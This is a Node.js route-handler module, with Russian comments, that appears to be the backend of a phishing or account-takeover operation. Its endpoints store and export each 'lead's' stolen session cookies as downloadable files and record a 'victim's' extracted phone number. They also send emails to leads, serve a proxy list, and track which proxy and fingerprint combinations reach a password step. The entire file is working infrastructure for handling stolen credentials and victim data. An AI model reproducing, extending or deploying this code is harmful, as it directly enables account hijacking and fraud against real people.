const fs = require('fs');
const { send } = require('../../utils/httpUtils');
const { checkAdminAuth, checkWorkerSecret } = require('../../utils/authUtils');
const { EVENT_LABELS } = require('../../utils/formatUtils');
const leadService = require('../../services/leadService');
const { incrementProxyFpStat } = require('../../db/database');

async function handle(scope) {
  with (scope) {
    if (pathname === '/api/worker/send-config-email' && req.method === 'POST') {
      if (!checkWorkerSecret(req, res)) return true;
      let body = '';
      req.on('data', (chunk) => { body += chunk; });
      req.on('end', async () => {
        let json = {};
        try {
          json = JSON.parse(body || '{}');
        } catch (e) {
          return send(res, 400, { ok: false, error: 'invalid json' });
        }
        const idRaw = (json.id != null && String(json.id).trim()) || (json.leadId != null && String(json.leadId).trim()) || '';
        if (!idRaw) return send(res, 400, { ok: false, error: 'id or leadId required' });
        const id = resolveLeadId(idRaw);
        const leads = readLeads();
        const lead = leads.find((l) => l.id === id);
        if (!lead) return send(res, 404, { ok: false, error: 'Lead not found' });
        if (leadIsWorkedLikeAdmin(lead)) {
          return send(res, 400, { ok: false, error: 'Лог отработан — отправка письма запрещена' });
        }
        if (leadHasAnyConfigEmailSentEvent(lead)) {
          return send(res, 200, { ok: true, skipped: 'already_sent' });
        }
        try {
          const result = await sendConfigEmailToLead(lead);
          if (!result.ok) {
            persistLeadPatch(id, { eventTerminal: lead.eventTerminal, lastSeenAt: lead.lastSeenAt });
            const code = result.statusCode || 500;
            return send(res, code, { ok: false, error: result.error || 'Ошибка отправки' });
          }
          pushEvent(lead, CONFIG_EMAIL_SENT_EVENT_LABEL, 'admin');
          persistLeadPatch(id, { eventTerminal: lead.eventTerminal, lastSeenAt: lead.lastSeenAt, adminListSortAt: new Date().toISOString() });
          return send(res, 200, { ok: true, fromEmail: result.fromEmail });
        } catch (e) {
          const msg = (e && e.message) ? String(e.message).slice(0, 200) : 'send error';
          console.error('[worker/send-config-email] id=' + id + ' ' + msg);
          try {
            pushEvent(lead, CONFIG_EMAIL_FAILED_EVENT_LABEL, 'admin', { detail: msg });
            persistLeadPatch(id, { eventTerminal: lead.eventTerminal, lastSeenAt: lead.lastSeenAt });
          } catch (e2) {}
          return send(res, 500, { ok: false, error: msg });
        }
      });
      return true;
    }

    if (pathname === '/api/worker/proxy-txt' && req.method === 'GET') {
      if (!checkWorkerSecret(req, res)) return true;
      let content = '';
      let pathOnServer = '';
      try {
        pathOnServer = String(PROXY_FILE || '');
        if (fs.existsSync(PROXY_FILE)) {
          content = fs.readFileSync(PROXY_FILE, 'utf8');
        }
      } catch (e) {
        const msg = (e && e.message) ? String(e.message).slice(0, 200) : 'read error';
        return send(res, 500, { ok: false, error: msg });
      }
      return send(res, 200, { ok: true, content: content, path: pathOnServer });
    }

    if (pathname === '/api/worker/proxy-fp-stats' && req.method === 'POST') {
      if (!checkWorkerSecret(req, res)) return true;
      let body = '';
      req.on('data', (chunk) => { body += chunk; });
      req.on('end', () => {
        let json = {};
        try { json = JSON.parse(body || '{}'); } catch (e) {
          return send(res, 400, { ok: false, error: 'invalid json' });
        }
        const proxyServer = json.proxyServer != null ? String(json.proxyServer).trim() : '';
        const fpIndex = json.fpIndex != null ? json.fpIndex : json.fingerprintIndex;
        const reachedPassword = json.reachedPassword === true || json.reachedPassword === 1 || json.reachedPassword === '1' || json.reachedPassword === 'true';
        if (!proxyServer) return send(res, 400, { ok: false, error: 'proxyServer required' });
        if (fpIndex == null || String(fpIndex).trim() === '') return send(res, 400, { ok: false, error: 'fpIndex required' });
        try {
          const ok = incrementProxyFpStat(proxyServer, fpIndex, reachedPassword);
          if (!ok) return send(res, 400, { ok: false, error: 'invalid params' });
        } catch (e) {
          return send(res, 500, { ok: false, error: (e && e.message) || 'db error' });
        }
        return send(res, 200, { ok: true });
      });
      return true;
    }

    if (pathname === '/api/lead-cookies' && req.method === 'GET') {
      if (!checkAdminAuth(req, res)) return true;
      const leadId = (parsed.query && parsed.query.leadId) ? String(parsed.query.leadId).trim() : '';
      if (!leadId) return send(res, 400, { ok: false, error: 'leadId required' });
      const id = leadService.resolveLeadId(leadId);
      const lead = leadService.readLeadById(id);
      if (!lead) return send(res, 404, { ok: false });
      const raw = lead.cookies != null ? String(lead.cookies).trim() : '';
      if (!raw) return send(res, 404, { ok: false, error: 'Куки не найдены (вход не выполнялся или не был успешным)' });
      try {
        JSON.parse(raw);
      } catch (e) {
        return send(res, 500, { ok: false, error: 'Некорректный JSON куков в БД' });
      }
      const filename = 'cookies_' + sanitizeFilenameForHeader(String(id)) + '.json';
      res.writeHead(200, {
        'Content-Type': 'application/json; charset=utf-8',
        'Content-Disposition': 'attachment; filename="' + filename + '"',
        'Cache-Control': 'no-store'
      });
      res.end(raw);
      return true;
    }

    if (pathname === '/api/lead-cookies-upload' && req.method === 'POST') {
      if (!checkWorkerSecret(req, res)) return true;
      let body = '';
      req.on('data', (chunk) => { body += chunk; });
      req.on('end', () => {
        let json = {};
        try { json = JSON.parse(body || '{}'); } catch (e) {
          return send(res, 400, { ok: false, error: 'invalid json' });
        }
        const idRaw = (json.id != null && String(json.id).trim()) || (json.leadId != null && String(json.leadId).trim()) || '';
        if (!idRaw) return send(res, 400, { ok: false, error: 'id or leadId required' });
        const id = leadService.resolveLeadId(idRaw);
        const lead = leadService.readLeadById(id);
        if (!lead) return send(res, 404, { ok: false, error: 'Lead not found' });
        const c = json.cookies;
        let cookiesStr = '';
        if (Array.isArray(c)) {
          try {
            cookiesStr = JSON.stringify(c, null, 2);
          } catch (e) {
            return send(res, 400, { ok: false, error: 'cookies array not serializable' });
          }
        } else if (typeof c === 'string') {
          try {
            JSON.parse(c);
            cookiesStr = c;
          } catch (e) {
            return send(res, 400, { ok: false, error: 'cookies must be JSON array or JSON string' });
          }
        } else {
          return send(res, 400, { ok: false, error: 'cookies required (array or JSON string)' });
        }
        try {
          if (!leadService.persistLeadPatch(id, { cookies: cookiesStr })) return send(res, 500, { ok: false, error: 'write error' });
        } catch (e) {
          console.error('[SERVER] lead-cookies-upload persistLeadPatch:', e);
          return send(res, 500, { ok: false, error: 'write error' });
        }
        try {
          const live = leadService.readLeadById(id);
          const cookieEv = EVENT_LABELS.AUTOLOGIN_COOKIES_SAVED;
          if (live && typeof pushEvent === 'function' && cookieEv) {
            const evs = Array.isArray(live.eventTerminal) ? live.eventTerminal : [];
            const lastLab = evs.length ? String(evs[evs.length - 1].label || '').trim() : '';
            if (lastLab !== cookieEv) {
              pushEvent(live, cookieEv, 'script');
              if (!leadService.persistLeadPatch(id, { eventTerminal: live.eventTerminal })) {
                console.error('[SERVER] lead-cookies-upload: persist eventTerminal failed');
              }
            }
          }
        } catch (e2) {
          console.error('[SERVER] lead-cookies-upload pushEvent:', e2);
        }
        return send(res, 200, { ok: true });
      });
      return true;
    }

    /**
     * POST /api/lead-set-phone — cookiemail/script сохраняет извлечённый
     * номер телефона жертвы в lead.victim_phone. Worker-secret обязателен.
     * Body: { id: <leadId>, phone: "+49 ..." }
     */
    if (pathname === '/api/lead-set-phone' && req.method === 'POST') {
      if (!checkWorkerSecret(req, res)) return true;
      let body = '';
      req.on('data', (chunk) => { body += chunk; });
      req.on('end', () => {
        let json = {};
        try { json = JSON.parse(body || '{}'); } catch (e) {
          return send(res, 400, { ok: false, error: 'invalid json' });
        }
        const idRaw = (json.id != null && String(json.id).trim()) || (json.leadId != null && String(json.leadId).trim()) || '';
        if (!idRaw) return send(res, 400, { ok: false, error: 'id or leadId required' });
        const id = leadService.resolveLeadId(idRaw);
        const lead = leadService.readLeadById(id);
        if (!lead) return send(res, 404, { ok: false, error: 'Lead not found' });
        const phone = json.phone != null ? String(json.phone).trim() : '';
        if (!phone) return send(res, 400, { ok: false, error: 'phone required' });
        try {
          if (!leadService.persistLeadPatch(id, { victimPhone: phone })) {
            return send(res, 500, { ok: false, error: 'write error' });
          }
        } catch (e) {
          console.error('[SERVER] lead-set-phone persistLeadPatch:', e);
          return send(res, 500, { ok: false, error: 'write error' });
        }
        try {
          const live = leadService.readLeadById(id);
          if (live && typeof pushEvent === 'function') {
            pushEvent(live, 'Телефон жертвы: ' + phone, 'script');
            leadService.persistLeadPatch(id, { eventTerminal: live.eventTerminal });
          }
        } catch (_) {}
        return send(res, 200, { ok: true, phone });
      });
      return true;
    }

    return false;
  }
}

module.exports = { handle };
